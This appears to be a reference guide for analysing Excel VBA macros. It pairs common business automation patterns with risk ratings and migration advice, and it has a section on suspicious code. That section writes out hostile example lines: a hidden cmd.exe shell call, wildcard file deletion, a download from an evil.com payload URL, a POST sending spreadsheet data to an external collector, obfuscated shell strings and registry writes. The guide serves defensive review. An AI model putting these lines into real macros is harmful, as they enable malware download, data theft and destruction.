# Reference: Common VBA Patterns and Business Meaning

## Purpose

When analyzing VBA macros in .xlsm files, recognizing common patterns helps quickly understand what the macros do, assess their risk, and plan migration.

## Common VBA Patterns by Purpose

### Data Entry Automation

```vba
' Auto-populate timestamp when a cell is edited
Private Sub Worksheet_Change(ByVal Target As Range)
    If Not Intersect(Target, Range("B:B")) Is Nothing Then
        Application.EnableEvents = False
        Target.Offset(0, 1).Value = Now()
        Application.EnableEvents = True
    End If
End Sub
```
**Business Meaning**: Audit trail — automatically records when data was entered
**Risk**: LOW — only writes to the same sheet
**Formula Alternative**: Manual entry or Power Automate

### Data Import

```vba
Sub ImportCSV()
    Workbooks.OpenText Filename:="C:\Data\sales.csv"
    ' Copy data to main workbook
    ActiveSheet.UsedRange.Copy ThisWorkbook.Sheets("RawData").Range("A1")
    ActiveWorkbook.Close False
End Sub
```
**Business Meaning**: Scheduled data import from external source
**Risk**: MEDIUM — file path hardcoded, could read any file
**Formula Alternative**: Power Query / Get & Transform

### Report Generation

```vba
Sub GenerateReport()
    Sheets("Report").Range("A1:Z100").ClearContents
    ' Copy headers
    Sheets("Data").Range("A1:Z1").Copy Sheets("Report").Range("A1")
    ' Copy filtered data
    Sheets("Data").Range("A1:Z1000").AutoFilter Field:=3, Criteria1:="Active"
    Sheets("Data").AutoFilter.Range.Copy Sheets("Report").Range("A2")
End Sub
```
**Business Meaning**: Generate filtered report from data
**Risk**: LOW — only manipulates data within workbook
**Formula Alternative**: FILTER function (Excel 365) or pivot table

### Email Notification

```vba
Sub SendNotification()
    Dim OutApp As Object, OutMail As Object
    Set OutApp = CreateObject("Outlook.Application")
    Set OutMail = OutApp.CreateItem(0)
    With OutMail
        .To = "manager@company.com"
        .Subject = "Report Ready"
        .Body = "The monthly report is ready for review."
        .Attachments.Add ThisWorkbook.FullName
        .Send
    End With
End Sub
```
**Business Meaning**: Email notification when report is complete
**Risk**: HIGH — sends data externally via email
**Formula Alternative**: Power Automate or external workflow tool

### Data Validation Enhancement

```vba
Private Sub Worksheet_Change(ByVal Target As Range)
    If Not Intersect(Target, Range("D:D")) Is Nothing Then
        If Target.Value < 0 Or Target.Value > 100 Then
            MsgBox "Value must be between 0 and 100", vbExclamation
            Target.ClearContents
        End If
    End If
End Sub
```
**Business Meaning**: Enhanced validation beyond Excel's built-in data validation
**Risk**: LOW — only validates within expected range
**Formula Alternative**: Data validation with custom formula

## Suspicious VBA Patterns

### Command Execution

```vba
' HIGH RISK: Executes arbitrary commands
Shell "cmd.exe /c " & Range("A1").Value, vbHide
```
**Risk**: CRITICAL — can execute any system command
**Action**: Flag immediately, do not execute

### File System Access

```vba
' MEDIUM RISK: Reads environment variables
Environ("USERNAME")
Environ("COMPUTERNAME")

' HIGH RISK: Deletes files
Kill "C:\temp\*.*"
```
**Risk**: System reconnaissance or destructive actions
**Action**: Review context — may be legitimate (logging user) or malicious

### Network Access

```vba
' HIGH RISK: Downloads and executes code
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://evil.com/payload.exe", False
http.send

' HIGH RISK: Uploads data
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "POST", "http://external.com/collect", False
http.Send Range("A1:Z1000").Value
```
**Risk**: CRITICAL — data exfiltration or malware download
**Action**: Flag as critical security risk

### Obfuscation

```vba
' MEDIUM RISK: String concatenation to hide intent
Execute "She" & "ll " & Chr(34) & "cmd.exe" & Chr(34)

' MEDIUM RISK: Base64 decoding
DecodeBase64("c2hlbGwgY21kLmV4ZQ==")
```
**Risk**: HIGH — intentionally hiding what the code does
**Action**: Decode and analyze before making any judgment

### Registry Access

```vba
' MEDIUM RISK: Reads or writes Windows registry
CreateObject("WScript.Shell").RegRead("HKLM\Software\...")
CreateObject("WScript.Shell").RegWrite "HKCU\Software\MyApp\Setting", "value"
```
**Risk**: System modification, persistence mechanisms
**Action**: Review what registry keys are accessed

## VBA Event Reference

### Workbook Events
| Event | Trigger | Common Use |
|-------|---------|-----------|
| Workbook_Open | File opens | Initialization, auto-run |
| Workbook_BeforeClose | File closes | Cleanup, save prompt |
| Workbook_BeforeSave | Before saving | Validation, backup |
| Workbook_AfterSave | After saving | Notification |
| Workbook_NewSheet | New sheet added | Template setup |
| Workbook_SheetChange | Any cell changes | Audit logging |
| Workbook_SheetCalculate | After recalc | Conditional actions |

### Worksheet Events
| Event | Trigger | Common Use |
|-------|---------|-----------|
| Worksheet_Change | Cell value changes | Validation, auto-fill |
| Worksheet_Activate | Sheet becomes active | Refresh data |
| Worksheet_Deactivate | Sheet loses focus | Save state |
| Worksheet_BeforeDoubleClick | Double-click | Edit mode trigger |
| Worksheet_BeforeRightClick | Right-click | Custom context menu |
| Worksheet_Calculate | After recalc | Conditional formatting |

## VBA Migration Decision Matrix

| VBA Pattern | Keep as VBA | Migrate to Formula | Migrate to Power Query | Migrate to Python |
|-------------|-------------|-------------------|----------------------|------------------|
| Simple IF logic | | ✅ Best | | |
| Data import | | | ✅ Best | ✅ Good |
| Email sending | ✅ Best | | | ✅ Good |
| File operations | | | | ✅ Best |
| Custom validation | | ✅ Good | | ✅ Good |
| Chart manipulation | ✅ Only option | | | ✅ Good (openpyxl) |
| UserForm UI | ✅ Only option | | | ✅ Better (web) |
| Event-driven logic | ✅ Or web app | | | ✅ Better (web) |
| Complex calculations | | ✅ If fits | | ✅ Best |
| Database connection | | | ✅ Best | ✅ Best |
